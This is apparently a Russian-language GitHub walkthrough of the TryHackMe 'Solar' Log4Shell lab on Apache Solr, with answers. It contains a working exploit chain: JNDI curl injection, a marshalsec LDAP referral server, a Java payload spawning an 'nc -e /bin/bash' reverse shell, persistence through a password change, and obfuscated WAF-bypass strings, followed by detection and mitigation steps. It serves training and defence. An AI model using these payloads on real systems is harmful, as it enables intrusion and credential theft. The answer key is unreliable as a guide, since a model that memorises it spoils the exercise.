[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Solar, exploiting log4j](https://tryhackme.com/r/room/solar) 

Всего 11 заданий:
## Задание 1
9 декабря 2021 года миру стало известно о новой уязвимости, обозначенной как CVE -2021-44228, которая затрагивает 
пакет регистрации Java log4j. Эта уязвимость получила оценку серьезности 10,0 (наиболее критическое обозначение) и 
предлагает удаленный код тривиальное удаленное выполнение кода на хостах, взаимодействующих с программным 
обеспечением, которое использует эту log4jверсию. Эта атака получила название «Log4Shell»

Сегодня доступна log4jверсия 2.16.0 , которая исправляет эту уязвимость (JNDI полностью отключен, поддержка Message 
Lookups удалена, а новая DoS-уязвимость CVE-2021-45046 отсутствует).  https://github.com/apache/logging-log4j2/releases/tag/rel%2F2.16.0 

Однако, явная опасность этой уязвимости обусловлена тем, насколько вездесущ этот пакет ведения журнала. Миллионы 
приложений, а также поставщиков программного обеспечения используют этот пакет как зависимость в своем собственном 
коде. Хотя вы можете иметь возможность исправить свою собственную кодовую базу с помощью log4j, другим поставщикам и 
производителям все равно придется продвигать свои собственные обновления безопасности ниже по течению. Многие 
исследователи безопасности сравнивают эту уязвимость с уязвимостью Shellshock по характеру ее огромной поверхности 
атаки. Мы увидим эту уязвимость в течение многих лет. 

Для получения постоянно растущего списка поддерживаемого сообществом программного обеспечения и служб, уязвимых для 
CVE -2021-44228, посетите этот репозиторий GitHub: 

https://github.com/YfryTchsGD/Log4jAttackSurface
В этом зале будет показано, как можно протестировать, использовать и устранить эту уязвимость в Log4j.

Хотя существует ряд других статей, блогов, ресурсов и учебных материалов, посвященных CVE -2021-44228, я (автор 
этого упражнения) особенно неравнодушен к этим:  

https://www.huntress.com/blog/rapid-response-critical-rce-vulnerability-is-affecting-java
https://log4shell.huntress.com/
https://www.youtube.com/watch?v=7qoPDq41xhQ
Примечание автора:

Пожалуйста, используйте информацию, которую вы узнаете в этой комнате, чтобы улучшить  ландшафт безопасности. Тестируйте свои системы, применяйте исправления и смягчения, где это уместно, и помогите всей отрасли восстановиться. Это очень актуальная и реальная угроза — независимо от того, являетесь ли вы тестером на проникновение, членом красной команды, специалистом по реагированию на инциденты, аналитиком безопасности, членом синей команды или кем-то еще — это упражнение поможет вам и миру понять и осознать эту широко распространенную уязвимость. Ее не следует использовать для эксплуататорской выгоды или корыстного финансового стимула (я смотрю на вас, охотники за головами)

Кроме того, пожалуйста, имейте в виду, что разработчики пакета log4j работают над проектом с открытым исходным кодом с любовью и страстью. Они являются разработчиками-волонтерами, которые поддерживают свой проект в свободное время. Не должно быть абсолютно никаких нападок, стыда или злобы по отношению к этим людям. Как и во всем остальном, пожалуйста, расширяйте свои знания, чтобы вы могли стать пьедесталом и опорой для сообщества информационной безопасности. Просвещайте, делитесь и помогайте .

### Ответьте на вопросы ниже
Прочитайте вышеизложенное и разверните целевую виртуальную машину.
```commandline
Ответ не нужен
```
Мы рекомендуем вам использовать веб-ориентированный AttackBox TryHackMe для этих упражнений, однако инструкции по его локальному использованию подробны. Чтобы запустить AttackBox, нажмите синюю кнопку «Запустить AttackBox» в верхней части страницы.


```commandline
Ответ не нужен
```

## Задание 2
Целевая виртуальная машина включает в себя программное обеспечение, которое использует этот уязвимый log4jпакет, 
предоставляя вам площадку для изучения уязвимости. 

После развертывания виртуальной машины вы должны обнаружить, что IP-адрес (доступный в рамках TryHackMe VPN или 
через предоставленный AttackBox) — MACHINE_IP. 

Для начала, начните с базовой разведки, чтобы понять, какие порты открыты на этой машине. Лучше всего это сделать в 
дистрибутиве Linux , например Kali Linux , ParrotOS, Black Arch (или любой другой по вашему выбору) с помощью 
nmapинструмента командной строки:  

Запустите базовое сканирование nmap на уязвимой машине.
`attackbox@tryhackme$ nmap -v MACHINE_IP`
Приложение, присутствующее на этой цели, специально использует порты, которые могут быть не сразу замечены nmap. Для 
"полной картины" просканируйте все порты следующим образом: 

Сканировать все порты на машине через nmap
`attackbox@tryhackme$ nmap -v -p- MACHINE_IP`
### Ответьте на вопросы ниже
Просканируйте устройство, чтобы определить, какие порты доступны.
```commandline
Ответ не нужен
```
Какая служба работает на порту 8983? (Просто название программы)
```commandline
Apache Solr
```

## Задание 3
На этой целевой машине запущен Apache Solr 8.11.0, один из примеров программного обеспечения, которое, как известно, включает этот уязвимый log4jпакет. Для демонстрации этой уязвимости приложение работает на Java 1.8.0_181.

Изучите веб-интерфейс, доступный по адресуhttp://MACHINE_IP:8983 и кликните, чтобы почувствовать приложение. Для получения более подробной информации об Apache Solr, пожалуйста, посетите их официальный сайт.  https://solr.apache.org/

Этот экземпляр Apache Solr предоставляется без каких-либо данных. Это плоская, ванильная и абсолютно минимальная установка — но в своей основе она все еще уязвима для этой CVE -2021-44228. 

### Ответьте на вопросы ниже
Внимательно посмотрите на первую страницу, видимую при переходе на  http://MACHINE_IP:8983. Вы должны увидеть четкие 
индикаторы того, что log4j используется в приложении для регистрации активности.  Какой -Dsolr.log.dir аргумент 
установлен, отображаемый на главной странице? 
```commandline
/var/solr/logs
```
Загрузите прикрепленные файлы (доступные в правом верхнем углу этой задачи), посмотрите несколько примеров файлов 
журнала в Solr. Изучите каждый файл, хотя бы для того, чтобы понять, что отображается в каком журнале.  

Один файл имеет значительное количество INFOзаписей, показывающих повторные запросы к одной определенной конечной 
точке URL. Какой файл содержит эту повторную запись? (Только само имя файла, путь не нужен) 
```commandline
solr.log
```
Какой «путь» или конечная точка URL указаны в этих повторяющихся записях?
```commandline
/admin/cores
```
Просматривая эти записи журнала, какое имя поля указывает на некоторую точку входа данных, которую вы как 
пользователь можете контролировать? (Просто имя поля) 
```commandline
params
```

## Задание 4
Обратите внимание, что конечная точка URL, которую вы только что обнаружили, должна быть предварена префиксом solr/ 
при просмотре ее из веб-интерфейса. Это означает, что вам следует посетить:

http://MACHINE_IP:8983/solr/admin/cores

Вы также заметили, что, params похоже, это включено в файл журнала. На этом этапе вы, возможно, уже начинаете видеть 
вектор атаки.

Пакет log4j добавляет дополнительную логику в журналы, «анализируя» записи, в конечном итоге, для обогащения данных, 
но может дополнительно предпринимать действия и даже оценивать код на основе данных записи. Это суть CVE -2021-44228.
Другой синтаксис может быть фактически выполнен так же, как он введен в файлы журналов.

Вот несколько примеров такого синтаксиса:
```commandline
${sys:os.name}
${sys:user.name}
${log4j:configParentLocation}
${ENV:PATH}
${ENV:HOSTNAME}
${java:version}
```

Вы, возможно, уже знаете общую полезную нагрузку для злоупотребления этой уязвимостью log4j. Формат обычного 
синтаксиса, который использует это преимущество, выглядит так: 

`${jndi:ldap://ATTACKERCONTROLLEDHOST}`

Этот синтаксис указывает на то, что log4j будет вызывать функциональность из «JNDI» или «Java Naming and Directory 
Interface». В конечном итоге это может быть использовано для доступа к внешним ресурсам или «ссылкам», что и 
используется в качестве оружия в этой атаке.   

Обратите внимание на ldap://схему. Это означает, что цель будет обращаться к конечной точке (контролируемому 
злоумышленником местоположению, в случае этой атаки) через протокол LDAP. Для краткости нам не нужно будет здесь 
описывать все тонкости и детали LDAP, но знайте, что это то, с чем нам нужно будет работать, пока мы совершенствуем 
нашу атаку.

На данный момент знайте, что цель фактически установит соединение с внешним местоположением. Это указано в 
ATTACKERCONTROLLEDHOST заполнительном поле в приведенном выше синтаксисе. Вы, выступая в качестве атакующего в этом 
сценарии, можете разместить простой прослушиватель для просмотра этого соединения.

Следующий вопрос: где можно ввести этот синтаксис?

В любом месте, где приложение регистрирует данные.

Вот в чем суть этой уязвимости. К сожалению, очень сложно определить, где находится поверхность атаки для разных 
приложений, и, следовательно, какие  приложения на самом деле уязвимы. Простое наблюдение за наличием файлов log4j 
не дает подсказки о точном номере версии или даже о том, где или как приложение может использовать пакет.  

Вспомните предыдущую задачу. Вы уже обнаружили, что можете предоставить paramsURL /solr/admin/cores, и теперь, когда 
вы лучше понимаете, как работает log4j, вы должны понимать, что именно здесь  вы предоставляете свой синтаксис 
инъекции. Вы можете просто предоставить переменные или параметры HTTP GET, которые затем будут обработаны и 
проанализированы log4j. Все, что нужно, это эта одна строка текста — и это делает эту уязвимость чрезвычайно простой 
для эксплуатации.    

В других местах вы можете указать этот синтаксис JNDI:
- Поля ввода, формы входа в систему с использованием имени пользователя и пароля, точки ввода данных в приложениях
- Заголовки HTTPUser-Agent , такие как , X-Forwarded-For или другие настраиваемые заголовки
- Любое место для данных, предоставленных пользователем
Если вам нужна дополнительная информация об этом векторе атаки JNDI, ознакомьтесь с презентацией Black Hat USA от 2016 года.

https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE .pdf

### Ответьте на вопросы ниже
Чтобы подготовить свою среду для тестирования уязвимости и получения соединения, просмотрите IP-адрес своей 
атакующей машины с помощью следующей команды: 

Посмотреть IP-адрес машины AttackBox
attackbox@tryhackme$ ip addr show
```commandline
Ответ не нужен
```
Подготовьте прослушиватель netcat на любом порту по вашему выбору (9999 — хороший пример):

Настройка прослушивателя netcat
attackbox@tryhackme$ nc -lnvp 9999
```commandline
Ответ не нужен
```
Теперь, когда у вас есть подготовленный слушатель, сделайте запрос, включающий этот примитивный синтаксис полезной 
нагрузки JNDI как часть параметров HTTP. Это можно легко сделать с помощью утилиты командной строки curl. 

Сделайте запрос curl с полезной нагрузкой JNDI
attackbox@tryhackme$ curl 'http://MACHINE_IP:8983/solr/admin/cores?foo=$\{jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:9999\}'
Обратите внимание, что из-за использования символа доллара $ в вашем синтаксисе вы должны убедиться, что вы 
заключили URL в одинарные кавычки, чтобы bash (ваша командная оболочка) не интерпретировала его как переменную. 
Кроме того, вы должны экранировать фигурные скобки { } одним символом обратной косой черты, чтобы они не были 
неправильно представлены в аргументах команды curl.   
```commandline
Ответ не нужен
```
Убедитесь, что соединение установлено, увидев следующее сообщение в вашем прослушивателе netcat:

Connection received from MACHINE_IP
```commandline
Ответ не нужен
```

## Задание 5
На этом этапе вы убедились, что цель действительно уязвима, увидев, что это соединение поймано в вашем 
netcat слушателе. Однако он сделал запрос LDAP... так что все, что ваш netcat слушатель мог увидеть, это непечатаемые 
символы (странно выглядящие байты). Теперь мы можем построить на этой основе ответ с помощью настоящего обработчика 
LDAP.   

Мы будем использовать общедоступную утилиту с открытым исходным кодом для подготовки " LDAP Referral Server ". Это 
будет использоваться для перенаправления первоначального запроса жертвы в другое место, где вы можете разместить 
вторичную полезную нагрузку, которая в конечном итоге запустит код на цели. Это выглядит следующим образом:

`${jndi:ldap://attackerserver:1389/Resource}->` обращается к нашему серверу ссылок LDAP
Сервер ссылок LDAP направляет запрос на вторичный сервер http://attackerserver/resource
Жертва извлекает и выполняет код, присутствующий в http://attackerserver/resource
Это значит, что нам понадобится HTTP- сервер, который мы можем просто разместить с помощью любого из следующих 
вариантов (обслуживающий порт 8000): 

- `python3 -m http.server`
- `php -S 0.0.0.0:8000`
- (или любой другой busybox httpd официальный веб-сервис, который вам может понравиться)
Если вы застряли на каком-либо из следующих шагов, у нас есть видео, демонстрирующее (с использованием AttackBox) 
каждый шаг для получения удаленного выполнения кода:  https://youtu.be/OJRqyCHheRE 

### Ответьте на вопросы ниже
Прочитайте и поймите цепочку атак, представленную выше.
```commandline
Ответ не нужен
```
Однако первым делом нужно получить сервер ссылок LDAP. Мы воспользуемся утилитой,  marshalsec предлагаемой на  
https://github.com/mbechler/marshalsec 

В конечном счете, это должно запустить Java. Просмотрев README для этой утилиты, мы видим, что предлагается 
использовать Java 8. (Вы можете добиться успеха, используя другую версию, но, чтобы «играть по правилам», мы будем 
использовать ту же версию Java, которая используется на целевой виртуальной машине)  

Если вы используете TryHackMe AttackBox, вам НЕ нужно выполнять следующие шаги — переходите к следующему вопросу.

См. шаги по локальной установке Java 8 (выполняйте только если не используете AttackBox)
```commandline
Ответ не нужен
```
Далее нам нужно будет получить утилиту marshalsec, о которой упоминалось ранее.  Если вы находитесь на AttackBox, 
перейдите к `/root/Rooms/solar/marshalsec`

Перейдите в папку marshalsec
`attackbox@tryhackme$ cd /root/Rooms/solar/marshalsec`
См. шаги по локальной загрузке marshalsec (выполняйте только если не используете AttackBox)
```commandline
Ответ не нужен
```
Мы должны собрать marshalsec с помощью Java builder maven.  Если в вашей системе еще нет maven, вы можете установить 
его  через менеджер пакетов (не обязательно, если вы используете AttackBox): sudo apt install maven 

Далее выполните команду для сборки marshalsec утилиты:

Сборка инструмента marshalsec с помощью maven
`attackbox@tryhackme:~/root/Rooms/solar/marshalsec$ mvn clean package -DskipTests`
Обратите внимание, что AttackBox для бесплатных пользователей не имеет интернета и не устанавливает пакеты maven. 
Либо подпишитесь, чтобы выполнить эту лабораторную работу через AttackBox, либо установите инструмент marshlsec локально. 
```commandline
Ответ не нужен
```
С помощью созданной утилиты marshalsec мы можем запустить сервер ссылок LDAP для прямых подключений к нашему 
вторичному HTTP-серверу (который мы подготовим буквально через минуту). Вы можете более чем свободно изучить 
использование, параметры и другие настройки, которые можно настроить с помощью этого инструмента, но для наглядности 
синтаксис для запуска сервера LDAP выглядит следующим образом:


Запустить LDAP-сервер
`attackbox@tryhackme:~/root/../marshalsec$ java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://YOUR.ATTACKER.IP.ADDRESS:8000/#Exploit"`
При необходимости измените IP-адрес атакующей машины. Обратите внимание, что мы предоставим прослушиваемый HTTP-порт 8000.

Каков результат выполнения этой команды? (Оставьте это окно терминала открытым, так как оно будет активно ожидать подключений)


```commandline
Listening on 0.0.0.0:1389
```
Теперь, когда наш сервер LDAP готов и ждет, мы можем открыть второе окно терминала для подготовки нашей 
окончательной полезной нагрузки и вторичного HTTP-сервера. 

В конечном счете, уязвимость log4j выполнит произвольный код, который вы создадите в языке программирования Java. 
Если вы не знакомы с Java, не волнуйтесь — мы будем использовать простой синтаксис, который просто «выходит за 
рамки» запуска системной команды. Фактически, мы получим обратное соединение оболочки, чтобы получить контроль над 
целевой машиной!

Создайте и переместите в новый каталог, где вы можете разместить эту полезную нагрузку. Сначала создайте свою 
полезную нагрузку в текстовом редакторе по вашему выбору (mousepad, nano, vim, Sublime Text, VS Code, что угодно), с 
определенным  именем Exploit.java:


Сохраните код эксплойта Java и измените его на свой IP-адрес.
```commandline
public class Exploit {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

Измените IP-адрес и номер порта злоумышленника соответствующим образом (мы, как и прежде, используем в качестве 
примера номер порта 9999). 

Для этой полезной нагрузки, как вы видите, мы выполним команду на цели, а именно `nc -e /bin/bash`, чтобы позвонить 
обратно на нашу атакующую машину. Эта цель была настроена с помощью ncat для простоты эксплуатации, хотя вы более 
чем приветствуетесь, чтобы экспериментировать с другими полезными нагрузками.  

Скомпилируйте полезную нагрузку `javac Exploit.java -source 8 -target 8` и проверьте ее успешность, запустив ls 
команду и найдя вновь созданный Exploit.class файл; удалите «-source 8 -target 8» из команды, если не используете 
attackbox.

Компилировать код эксплойта Java
`attackbox@tryhackme$ javac Exploit.java -source 8 -target 8`
Запустите указанное выше в той же папке, где вы сохранили файл Exploit.java.
```commandline
Ответ не нужен
```
После создания и компиляции полезной нагрузки вы можете разместить ее, развернув временный HTTP-сервер. 

Разместите файл эксплойта Java через HTTP
`attackbox@tryhackme$ python3 -m http.server`
```commandline
Ответ не нужен
```
Ваша полезная нагрузка создана и скомпилирована, она размещена на HTTP-сервере в одном терминале, ваш сервер ссылок 
LDAP запущен и ждет в другом терминале — затем подготовьте прослушиватель netcat для перехвата вашей обратной 
оболочки в еще одном новом окне терминала:  

Подготовьте свой прослушиватель netcat
`attackbox@tryhackme$ nc -lnvp 9999`
```commandline
Ответ не нужен
```
Наконец, все, что осталось сделать, это запустить эксплойт и запустить наш синтаксис JNDI! Обратите внимание на 
изменения в номере порта (теперь ссылающемся на наш сервер LDAP) и ресурсе, который мы извлекаем, указывая наш 
эксплойт:  


Активируйте эксплойт и запустите наш синтаксис JNDI
`attackbox@tryhackme$ curl 'http://MACHINE_IP:8983/solr/admin/cores?foo=$\{jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:1389/Exploit\}'`
При необходимости измените IP-адрес злоумышленника.

Запустите указанную выше команду и поймайте обратный шелл в вашем прослушивателе netcat!
```commandline
Ответ не нужен
```
Теперь вы получили начальный доступ и управление на чистом, свежеустановленном экземпляре Apache Solr. Это всего 
лишь один пример из многих, многих уязвимых приложений, затронутых этой уязвимостью log4j.  

На этом этапе злоумышленник может реально сделать с жертвой все, что захочет, — будь то повышение привилегий, 
эксфильтрация, установка постоянного доступа, выполнение горизонтального перемещения или любые другие действия после 
эксплуатации, — потенциально внедряя майнеры криптовалюты, трояны удаленного доступа, маяки и импланты или даже 
развертывая программы-вымогатели.    

Все, что потребовалось, — это одна строка текста и немного настройки с помощью свободно доступных инструментов. 
Именно поэтому Интернет был в огне в выходные 9 декабря 2021 года. 

Пожалуйста, обнимите всех знакомых вам спасателей.
```commandline
Ответ не нужен
```
ИНФОРМАЦИЯ ПО УСТРАНЕНИЮ НЕПОЛАДОК

Получив обратную оболочку, смело экспериментируйте с другими командами, которые вы могли бы запустить с помощью 
своей Exploit.java полезной нагрузки. В качестве упражнения для читателя — можете ли вы загрузить оболочку 
Meterpreter? Как насчет агента Empire? Маяка Cobalt Strike?    
```commandline
Ответ не нужен
```
## Задание 6
Теперь, когда вы получили обратное соединение с машиной-жертвой, вы можете продолжать выполнять любые действия, 
которые захотите. 

Чтобы лучше понять это log4j уязвимость, давайте предоставим себе «лучший доступ», чтобы мы могли исследовать машину, 
анализировать затронутые журналы и даже смягчить уязвимость!

Вы могли заметить из вашего предыдущего nmap сканирования, что SSH (порт 22) был открыт на хосте. На тот момент мы 
не знали никаких имен пользователей или паролей, поэтому попытка против этого протокола была бы бесполезной -- но 
теперь, когда у вас есть выполнение кода как у пользователя, вы потенциально можете добавлять закрытые ключи или 
менять пароли.   

### Ответьте на вопросы ниже
Проверьте, под какой учетной записью пользователя вы работаете в контексте вашей обратной оболочки.

Посмотрите, какой вы пользователь
`whoami`
Какой вы пользователь?
```commandline
solr
```
Если вы хотите «стабилизировать свою оболочку» для более легкого ввода команд, вы можете использовать обычный трюк с 
обновлением (предполагая, что вы работаете в bash оболочке. Если вы работаете в zsh, вам нужно будет запустить свой 
netcat прослушиватель в bash подоболочке... это должно быть достаточно просто для повторной эксплуатации):  

- (на обратной стороне корпуса)`python3 -c "import pty; pty.spawn('/bin/bash')"`
- (нажмите на клавиатуре) Ctrl+Z
- (нажмите на клавиатуре) Enter
- (на вашем локальном хосте) stty raw -echo
- (на локальном хосте)  fg (вы не увидите нажатия клавиш — доверьтесь себе и нажмите Enter)
- (нажмите на клавиатуре) Enter
- (нажмите на клавиатуре) Enter
- (на обратной оболочке)  Теперь у вас есть стабильная оболочка, в которой вы можете безопасно использовать клавиши 
  со стрелками влево и вправо для перемещения по вводимым данным, клавиши со стрелками вверх и вниз для просмотра 
  истории команд, Tab для автозаполнения и безопасное сочетание клавиш Ctrl+C для остановки запущенных программ!
  export TERM=xterm   
```commandline
Ответ не нужен
```
Проверьте разрешения суперпользователя. Для вашего удобства в этом упражнении ваш пользователь должен иметь 
sudoпривилегии без необходимости ввода пароля. 

Получить root-доступ
`$ sudo -l`
```commandline
Ответ не нужен
```
Если вы хотите предоставить себе сохранение и доступ к машине через SSH, на мгновение станьте root и измените пароль 
для solr пользователя на тот, который вы выберете. Таким образом, вы сможете входить по SSH по мере необходимости! 

Изменить пароль пользователя
`sudo bash`
`passwd solr`
```commandline
Ответ не нужен
```
В другом окне терминала подключитесь к машине по SSH, используя новые учетные данные.

SSH к машине
`attackbox@tryhackme$ ssh solr@MACHINE_IP`
```commandline
Ответ не нужен
```

## Задание 7
К сожалению, найти приложения, уязвимые для CVE-2021-44228 «Log4Shell», сложно .

Обнаружить эксплуатацию может быть еще сложнее, учитывая неограниченное количество потенциальных обходных путей. 

С учетом сказанного, сообщество информационной безопасности увидело невероятный поток усилий и поддержки для 
разработки инструментов, скриптов и кода для лучшего сдерживания этой угрозы. Хотя эта комната не будет 
демонстрировать каждую технику в деталях, вы снова можете найти огромное количество ресурсов в Интернете.  

Ниже приведены фрагменты, которые могут помочь в обоих начинаниях:
- https://github.com/mubix/ CVE -2021-44228-Log4Shell-Hashes  (локальная, на основе хэшей JAR-файлов log4j)
- https://gist.github.com/olliencc/8be866ae94b6bee107e3755fd1e9bf0d  (локальный, на основе хэшей файлов log4j CLASS)
- https://github.com/nccgroup/Cyber-Defence/tree/master/Intelligence/ CVE -2021-44228  (список уязвимых хэшей JAR и 
  CLASS)
- https://github.com/omrsafetyo/PowerShellSnippets/blob/master/Invoke-Log4ShellScan.ps1  (локально, поиск уязвимых 
  пакетов log4j в PowerShell )
- https://github.com/darkarnium/ CVE -2021-44228  (локально, правила YARA)
Напоминаем, что огромный ресурс доступен здесь: 

https://www.reddit.com/r/sysadmin/comments/reqc6f/log4j_0day_being_exploited_mega_thread_overview/

### Ответьте на вопросы ниже
Чтобы изучить наши собственные журналы, используйте ваше SSH-подключение или обратную оболочку, чтобы перейти в 
каталог, где хранятся журналы Solr. (Вы уже знаете, что это за путь — вы указали его в качестве ответа в задании № 3) 
```commandline
Ответ не нужен
```
Просмотрите файл журнала, который, как вы знаете, затронут log4j уязвимостью.
```commandline
Ответ не нужен
```
Обратите внимание на синтаксис атаки JNDI, включенный в записи журнала! Если вы хотите поэкспериментировать еще, 
попробуйте некоторые обходные пути, упомянутые в задаче ниже. 
```commandline
Ответ не нужен
```

## Задание 8
Продемонстрированная нами полезная нагрузка JNDI представляет собой стандартный и «типичный» синтаксис для 
выполнения этой атаки.

Если вы являетесь тестером на проникновение или членом Red Team, этот синтаксис может быть пойман брандмауэрами 
веб-приложений (WAF) или легко обнаружен. Если вы являетесь членом Blue Team или реагирующим на инциденты, вам 
следует активно искать и обнаруживать этот синтаксис.  

Поскольку эта атака использует log4j, полезная нагрузка в конечном итоге может получить доступ ко всем тем же трюкам 
расширения, подстановки и шаблонизации, которые пакет делает доступными. Это означает, что субъект угрозы может 
использовать любые трюки, чтобы скрыть, замаскировать или запутать полезную нагрузку.  

Имея это в виду, честно говоря, существует неограниченное количество обходов, чтобы прокрасться в этот синтаксис. 
Хотя мы не будем погружаться в детали в этом упражнении, вам предлагается поиграть с ними в этой среде. Внимательно 
прочитайте их, чтобы понять, какие трюки используются для маскировки исходного синтаксиса.  

В Интернете имеется множество ресурсов, демонстрирующих примеры таких обходных путей, некоторые из них приведены ниже:

```commandline
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/
${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/
${${::-j}ndi:rmi://attackerendpoint.com/}
```


Обратите внимание на использованиеrmi://протокол в последнем. Это также еще один допустимый метод, который может 
быть использован сmarshalsecполезность — не стесняйтесь экспериментировать! 

Кроме того, в движке log4j вы можете расширить произвольные переменные окружения (если это уже не было достаточно 
плохо). Подумайте об ущербе, который может быть нанесен даже при удаленном выполнении кода, но простое 
LDAP-соединение и эксфильтрация ${env:AWS_SECRET_ACCESS_KEY}  

Для других методов вам настоятельно рекомендуется провести собственное исследование. Значительное количество 
информации распространяется в этой ветке Reddit:  https://www.reddit.com/r/sysadmin/comments/reqc6f/log4j_0day_being_exploited_mega_thread_overview/ 

Нежное напоминание, используйте эти знания во благо . Вы знаете, как говорят... великая сила, великая 
ответственность и все такое. 


### Ответьте на вопросы ниже
Прочитайте вышеизложенное и напомните себе, что вы — специалист по безопасности с твердыми моральными принципами.

```commandline
Ответ не нужен
```

## Задание 9
Теперь, когда вы немного побыли в роли противника, снимите свою хакерскую шляпу и давайте смягчим уязвимость на этой уязвимой машине!  Ознакомьтесь с методами смягчения, предлагаемыми на веб-сайте Apache Solr.  https://solr.apache.org/security.html

Один из вариантов — вручную изменить  solr.in.sh файл с помощью определенного синтаксиса. Давайте пойдем по этому пути ради демонстрации этой оборонительной тактики.

Если вы хотите напрямую подключиться к машине по SSH , то учетные данные следующие: vagrant в качестве имени пользователя и vagrant в качестве пароля.

### Ответьте на вопросы ниже
Определите, где  solr.in.sh находится файл в файловой системе этой целевой машины. Вы можете сделать это быстро с 
помощью следующей команды:

Нахождение файла solr.in.sh
user@machine$ locate solr.in.sh
Вы можете увидеть два результата — нам нужен тот, который соответствует общесистемной конфигурации (см. подсказку, если вы не понимаете, о чем идет речь)

Каков полный путь к конкретному solr.in.shфайлу?
```commandline
/etc/default/solr.in.sh
```
На странице «Безопасность» веб-сайта Apache Solr объясняется, что в файл можно добавить следующий синтаксис solr.in.sh:

`SOLR_OPTS="$SOLR_OPTS -Dlog4j2.formatMsgNoLookups=true"`

Измените solr.in.sh файл с помощью текстового редактора по вашему выбору. Вам понадобится sudo префикс для 
заимствования root привилегий, если вы еще этого не сделали root. 

Прокрутите файл до конца и добавьте новую строку с указанным выше синтаксисом. Сохраните и закройте файл.
```commandline
Ответ не нужен
```
Теперь, когда файл конфигурации был изменен, службу все равно необходимо перезапустить, чтобы изменения вступили в силу.

Этот процесс может различаться в зависимости от установки, но для этого сервера вы можете перезапустить службу с 
помощью следующего синтаксиса: 

Перезапустить службу solr
`user@machine$ sudo /etc/init.d/solr restart`
Запустите указанную выше команду и дождитесь успешного перезапуска службы Apache Solr.
```commandline
Ответ не нужен
```
Чтобы убедиться, что исправление произошло, запустите еще один netcat прослушиватель, как и раньше, и запустите 
временный сервер ссылок LDAP и HTTP-сервер (снова в отдельных терминалах). 

Вам придется воссоздать ту же настройку, чтобы снова использовать машину.

Запустить прослушиватель netcat
`user@machine$ nc -lnvp 9999`
Если вам необходимо освежить в памяти синтаксис команды, прокрутите страницу до Задания №5.
```commandline
Ответ не нужен
```
Повторно запустите сервер, используя тот же curlсинтаксис команды, который вы использовали в задании №5.
```commandline
Ответ не нужен
```
Вы должны увидеть, что не было сделано ни одного запроса на ваш временный сервер LDAP, соответственно, не было 
сделано ни одного запроса на ваш сервер HTTP и... никакой обратный шелл не был отправлен обратно вашему netcat 
слушателю! 

Убедитесь, что этот экземпляр Apache Solr теперь защищен от эксплойта Log4shell!
```commandline
Ответ не нужен
```

## Задание 10
На момент создания этого упражнения Apache Solr 8.11.1 еще не был выпущен с формальным патчем для CVE -2021-44228. Наряду со многими другими поставщиками программного обеспечения, отрасль лихорадочно пытается исправить свое программное обеспечение и как можно быстрее донести его до конечных пользователей.

Пожалуйста, отнеситесь с пониманием к этому безумию. Существует так много потенциальных мест, где может присутствовать эта уязвимость log4j, что мы можем не увидеть конца этой уязвимости еще долгое-долгое время. На вас, на мне, на каждом из нас лежит ответственность за повышение осведомленности об этом инциденте и привлечение сообщества к ответственности за активное реагирование. Когда придет время, выпустите доступные исправления и продолжайте охотиться за случаями этой уязвимости. Это займет целую деревню.

При необходимости, пожалуйста, убедитесь, что вы исправилиlogging-log4j package to version 2.16.0 или выше (по мере выхода новых релизов). В версии  JNDI  полностью отключен, поддержка Message Lookups удалена, а новая DoS-уязвимость CVE -2021-45046 отсутствует. Загрузите этот релиз здесь:  https://github.com/apache/logging-log4j2/releases/tag/rel%2F2.16.0 2.16.0

Если вы отвечаете за выявление уязвимых служб, использующих log4j, здесь вы найдете список нескольких серьезно затронутых служб/продуктов  .

### Ответьте на вопросы ниже
«Я понимаю последствия этого и буду выпускать исправления как можно раньше, часто и всегда».

```commandline
Ответ не нужен
```
## Задание 11
Спасибо, что дочитали до конца, и я искренне надеюсь, что вы прочтете эти прощальные слова.

Это упражнение предлагается вам с искренним намерением улучшить вашу осведомленность, обучение и понимание этой уязвимости по правильным причинам. Представленный вам материал не был бы возможен без невероятного вклада исследователей безопасности, специалистов по реагированию на инциденты, системных администраторов и специалистов по безопасности по всей отрасли. Мы должны выразить огромную благодарность всем профессионалам, которые работают бессонными ночами круглосуточно, отказываясь от выходных и времени с друзьями и семьей, чтобы лучше защитить весь Интернет.

В то время как "голливудский взлом" - это круто и броско, кибербезопасность - это командный вид спорта. Пожалуйста, просмотрите внешние ресурсы и сделайте это сообщество лучше.

### Ответьте на вопросы ниже
Идите и творите великие дела!
```commandline
Ответ не нужен
```


[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)